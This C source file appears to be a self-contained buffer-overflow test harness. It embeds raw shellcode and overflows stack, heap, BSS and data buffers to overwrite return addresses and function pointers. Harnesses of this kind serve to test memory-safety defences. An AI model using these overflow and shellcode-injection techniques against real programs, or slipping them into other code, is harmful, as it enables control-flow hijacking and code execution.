#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "attack_generator.h"

static char shellcode_no_noop[] =
  "\x17\x05\x00\x00"
  "\x13\x05\xc5\x01"
  "\x93\x05\x10\x24"
  "\x12\x06\x60\x1b"
  "\x93\x06\x00\x00"
  "\x93\x08\x00\x40"
  "\x73\x00\x00\x00"
  "urhacked";

#define OLD_BP_PTR   __builtin_frame_address(0)
#define RET_ADDR_PTR ((void**)OLD_BP_PTR + 1)

const size_t shellcode_no_noop_size = sizeof(shellcode_no_noop);

ATTACKFORM attack;

CHARPAYLOAD payload;

void fooz() {
  printf("fooz was called\n");
}

struct attackme data_struct = {"AAAAAAAA", &fooz};

struct pointer_struct data_indirect;

void generate_payload() {

  static struct attackme bss_struct = {"AAAAAAAA", &fooz};

  static struct pointer_struct bss_indirect = {"AAAAAAA", NULL};
  
  if (attack.code_ptr == STRUCT_FUNC_PTR_BSS) {
    payload.overflow_ptr = payload.target_addr = bss_struct.buffer;
    payload.buffer = &bss_struct.func_ptr;
  }
  else if (attack.technique == INDIRECT && attack.location == BSS) {
    payload.buffer = bss_indirect.buf;
    payload.overflow_ptr = ((uintptr_t)(RET_ADDR_PTR) - 0x10);
    payload.target_addr = &bss_indirect.mem_ptr;
  }

  size_t total_size = (uintptr_t) payload.target_addr - (uintptr_t) payload.buffer + sizeof(int);

  char* temp_char_buffer = (char*) malloc(total_size);

  if(temp_char_buffer == NULL) {
    fprintf(stderr, "malloc failed\n");
  }

  int overflow_ptr = (int) payload.overflow_ptr;
  memcpy(temp_char_buffer, payload.contents, payload.size);

  char* tc_ra_location = (char*) ((uintptr_t) temp_char_buffer + total_size - sizeof(int));
  memcpy(tc_ra_location, &overflow_ptr, sizeof(int));
  memcpy(payload.buffer, temp_char_buffer, total_size);

  //we do this so that the compiler doesn't optimize away the memcpy
  printf("%c\n", *((char*) payload.buffer));
}

boolean is_attack_possible() {
  switch(attack.location) {
    case HEAP:
      if((attack.technique == DIRECT) && attack.code_ptr == RET_ADDR) {
        return FALSE;
      }
  }

  return TRUE;
}

int main() {  

  char buf[BUFFER_SIZE];

  struct pointer_struct stack_indirect;

  struct pointer_struct* heap_indirect = (struct pointer_struct*) malloc(sizeof(struct pointer_struct));

  struct attackme stack_struct;
  stack_struct.func_ptr = &fooz;

  struct attackme* heap_struct = (struct attackme*) malloc(sizeof(struct attackme));
  heap_struct->func_ptr = &fooz;

  attack.technique = INDIRECT;
  attack.code_ptr = RET_ADDR;
  attack.location = BSS;

  payload.size = shellcode_no_noop_size;

  if (attack.code_ptr == RET_ADDR) {
    payload.target_addr = (void*) ((uintptr_t) (RET_ADDR_PTR) - 0x10);
  } else if (attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
    payload.target_addr = (void*) &stack_struct.func_ptr;
  } else if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
    payload.target_addr = (void*) &heap_struct->func_ptr;
  } else if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
    payload.target_addr = (void*) &data_struct.func_ptr;
  }

  if (attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
    payload.buffer = payload.overflow_ptr = stack_struct.buffer;
  }
  else if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
    payload.buffer = payload.overflow_ptr = heap_struct->buffer;
  }
  else if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
    payload.buffer = payload.overflow_ptr = data_struct.buffer;
  }
  else if (attack.location == STACK) {
    if (attack.technique == DIRECT) {
      payload.buffer = payload.overflow_ptr = buf;
    } else if (attack.technique == INDIRECT) {
      payload.buffer = stack_indirect.buf;
      payload.overflow_ptr = ((uintptr_t) (RET_ADDR_PTR) - 0x10);
      payload.target_addr = &stack_indirect.mem_ptr;
    }
  }
  else if (attack.location == HEAP) {
    if (attack.technique == DIRECT) {
      payload.buffer = payload.overflow_ptr = malloc(100);
    } else if (attack.technique == INDIRECT) {
      payload.buffer = heap_indirect->buf;
      payload.overflow_ptr = ((uintptr_t) (RET_ADDR_PTR) - 0x10);
      payload.target_addr = &heap_indirect->mem_ptr;
    }
  }
  else if (attack.location == DATA) {
    if(attack.technique == INDIRECT) {
      payload.buffer = data_indirect.buf;
      payload.overflow_ptr = ((uintptr_t) (RET_ADDR_PTR) - 0x10);
      payload.target_addr = &data_indirect.mem_ptr;
    }
  }

  payload.contents = shellcode_no_noop;

  generate_payload(&payload);

  if (attack.technique == INDIRECT) {
    if (attack.location == STACK) {
      *((int*) (stack_indirect.mem_ptr)) = (int) payload.buffer;
      // done so that the compiler doesn't optimize away the write
      printf("stack_mem_ptr val is %x\n", *stack_indirect.mem_ptr);
    }
  }

  if (attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
    stack_struct.func_ptr();
  } else if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
    heap_struct->func_ptr();
  } else if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
    data_struct.func_ptr();
  }
}
